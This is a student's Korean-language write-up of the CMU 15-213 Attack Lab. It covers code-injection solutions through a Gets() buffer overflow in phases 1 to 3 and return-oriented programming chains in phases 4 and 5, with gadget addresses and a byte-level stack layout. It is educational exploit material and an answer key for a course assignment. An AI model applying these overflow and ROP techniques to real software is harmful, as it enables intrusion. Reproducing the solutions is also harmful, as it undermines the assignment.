# Lab3 Attacklab

> [09-machine-advanced.pdf](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/lectures/09-machine-advanced.pdf)
> video [lecture](https://scs.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx#folderID=%22b96d90ae-9871-4fae-91e2-b1627b43e25e%22)

The original lab material is `target1.tar`. My solution for phase 1~3 are in `target1/inj_atk` and for phase 4,5 is in `target1/ROP`. You should read `attacklab.pdf` first.

### code injection attack

- phase 1

`0x4017c0` 주소의 `touch1()` 함수를 호출해야 한다.

```asm
getbuf:
    sub    $0x28,%rsp
    mov    %rsp,%rdi
    call   0x401a40 <Gets>
    mov    $0x1,%eax
    add    $0x28,%rsp
    ret
```

`getbuf()` 는 스택에 40 byte 를 allocate 하고, 그 주소를 `Gets()` 에 넘겨준다. 우리는 `stdin` 을 통해, 그 주소로부터의 메모리에 접근할 수 있다. 40 byte 바로 위의 stack 에는 `getbuf()` 를 호출한 다음 명령어의 주소가 들어 있어 `ret` 을 입력받으면 그곳으로 `jump` 하는데, `Gets()` 는 입력받은 문자열의 길이를 검사하지 않으므로 40 바이트 이후의 입력을`0x4017c0` 으로 주면 `touch1` 에 접근할 수 있다.

`./hexdump < ./inj_atk/touch11.txt | ./rtarget -q`

- phase 2

`0x4017ec` 주소의 `touch2` 함수를 `cookie.txt` 에 있는 쿠키값을 매개변수로 하여 호출하여야 한다. 즉, `touch2` 함수를 호출하기 전에 `%rdi` 를 `0x59b997fa` 로 설정해야 한다. 그것을 위해 `getbuf()` 에서 stack 에 allocate 한 40 byte 의 공간에 명령어를 입력한 뒤, `0x4017ec` 로 `jump` 하도록 하자.

`getbuf()` 가 `ret` 된 뒤에는, stack 에 inject 한 명령어의 주소로 `jump` 해야 하므로, 40 byte 이후에는 그 주소를 입력해놓고, 그 다음 `touch2()` 가 호출되도록 `0x4017ec` 를 입력하자.

`touch22.asm` 에는 inject 할 명령어의 어셈블리 코드가 있다. `nasm -f elf64 touch22.asm` 을 통해 `touch22.o` 를 생성하고, `objdump -d touch22.o` 를 통해 해당 바이너리의 hex representation 을 보고 코드에 입력했다.

`getbuf()` 의 `caller` 인 `test()` 를 보면 `sub $0x8,%rsp` 를 통해 스택에 8 바이트를 allocate 하고 있는데, 스택의 어느 위치에 `touch2()` 의 주소를 입력하던 올바른 `%rsp` 를 설정하기만 하면 상관 없다.

문제의 경우에서 `touch2()` 는 리턴하지 않고 `exit` 나 `validate` 를 호출하여 프로세스를 종료시키므로 어디에 caller 의 주소가 입력되는지는 상관 없지만 만약 `touch2()` 가 리턴되었을 때에 `test()` 의 caller 로 돌아가게 하고 싶다면 `test()` 에서 allocate 한 8바이트의 공간에 리턴 주소를 입력시키고, inject 한 코드는 `rsp` 를 증가시키지 않고 리턴해야 한다.

`./hexdump < ./inj_atk/touch12.txt | ./rtarget -q`

- phase 3

`phase 2` 와 비슷하지만 이번엔 cookie 를 스트링으로 입력해야 한다. 아스키 코드로 인코딩한 후 메모리에 잘 inject 하고, `%rsi` 를 그 주소로 지정하는 코드도 inject 한 후, `phase 2` 와 똑같이 진행시켜 주자.

`./hexdump < ./inj_atk/touch13.txt | ./rtarget -q`

### return-oriented programming

- phase 4

`phase 2` 와 똑같이 cookie 를 인자로 `touch2` 를 호출하면 되지만 이번에 사용할 프로그램 `rtarget` 은 a) 스택의 주소를 무작위로 지정하며, b) 스택이 포함된 메모리 부분을 nonexecutable 로 설정하여 스택의 명령어가 execute 되면 segment fault 가 나도록 하는 방어 기술이 적용되어 있다.

그러나 `Gets()` 의 오버플로우 취약점은 여전하므로, 스택에 명령어 주소를 잘 배열하여 리턴시 예견되지 않은 명령을 실행할 수 있다. `start_farm` 부터 `mid_farm` 까지의 명령어를 잘 조합하여 `touch2(cookie)` 를 호출해 보자.

```d
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

다음 두 함수를 보면 `48 89 c7 c3` 은 `movq %rax, %rdi;ret` 로 인코딩되고, `58 90 c3` 은 `popq %rax;nop;ret` 로 인코딩된다. 즉, `0x4019ab` 와 `cookie`, `0x4019a2` 를 순차적으로 스택에 배열하면, `cookie` 값이 `pop` 되어서 `%rax` 에 적재된 이후, 이 값이 `%rdi` 로 옮겨진다. 이후 `touch2` 를 리턴하면 끝.

- phase 5

이번엔 `start_farm` 부터 `end_farm` 까지 주어진 더미 명령어들을 모두 이용하여 `phase 3` 의 스트링 호출을 하면 된다. 그걸 위해서 우리는 a) 스트링을 메모리에 입력시키고, b) 그 주소를 `%rdi` 에 적재하는 instruction 을 쨔야 한다. 헌데 앞서 언급한 방어책이 `rtarget` 에 적용되어 그 주소는 프로세스 이전에 예측할 수 없으므로, `%rsp` 로부터 그 주소를 알아내는 프로그램을 쨔야 한다.

중간에 있는 `add_xy` 함수로부터 `%rsp` 값과 거기로부터 떨어져있는 목표 스트링의 위치를 각각 `%rdi`, `%rsi` 에 적재하고, `add_xy` 를 호출한 후 `movq %rax, %rdi` 를 하도록 큰 틀을 잡는다.

구체적으로 사용할 수 있는 instruction 을 보기 위해 나는 `start_farm` 부터 `end_farm` 까지의 hex 코드를 메모장에 복사 붙여넣기 해서 `89` 로 검색해 사용할 수 있는 모든 `mov` instruction 을 파악한 뒤에, 해당 설계를 그 instruction 만으로 구현했다. 이 방법을 통해 `phase 5` 를 해결하는데에 걸리는 시간을 획기적으로(1시간 미만) 줄일 수 있었다. 아래는 그렇게 만든 코드의 어셈블리이다.

```asm
movq %rsp, %rax              # (1)
movq %rax, %rdi              # (2)
popq %rax                    # (3)
movl %eax, %edx              # (4)
movl %edx, %ecx              # (5)
movq %rcx, %rsi              # (6)
lea (%rdi, %rsi, 1), %rax    # (7)
movq %rax, %rdi              # (8)
```

여기서 주의할 점은, 중간에 32비트 instruction 이 사용된다는 거다. 이 instruction 은 레지스터의 하위 32비트에만 영향을 끼치고, 상위 32비트에는 아무 영향을 끼치지 않는다. 즉 `%rax` 에 적재된 값이 음수라면, 중간에 이 instruction 때문에 `add_xy` 를 통해 제대로 뺄 수 없다. 따라서 나는 타깃 문자열을 스택의 최하단에 배치하여 문자열이 (1) 번 명령줄의 `%rsp` 값보다 높은 메모리 주소를 갖도록 했다. 구체적인 스택의 배열은 다음과 같을 것이다:

|   주소  |    설명   | 값 |  |  |  |  | |  |    |
|:------:|:---------:|--|--|--|--|--|--|--|----|
|rsp + 80|string     |??|??|??|??|??|??|??|'\0'| 
|rsp + 72| string    |'a'|'f'|'7'|'9'|'9'|'b'|'9'|'5'|
|rsp + 64|touch3     |00|00|00|00|00|40|18|fa|
|rsp + 56| (8)       |00|00|00|00|00|40|19|a2|
|rsp + 48| (7)       |00|00|00|00|00|40|19|d6|
|rsp + 40| (6)       |00|00|00|00|00|40|1a|13|
|rsp + 32| (5)       |00|00|00|00|00|40|1a|34|
|rsp + 24| (4)       |00|00|00|00|00|40|19|dd|
|rsp + 16| number, 72|00|00|00|00|00|00|00|48|
|rsp + 8 | (3, pop)  |00|00|00|00|00|40|19|ab|
|  rsp   | (2)       |00|00|00|00|00|40|19|a2|
|rsp - 8 | (1)       |00|00|00|00|00|40|1a|06|

왼쪽의 "주소" 행의 주소는 "값" 행의 제일 오른쪽 바이트의 주소를 의미하며, 왼쪽으로 갈수록 메모리 주소가 1씩 증가한다.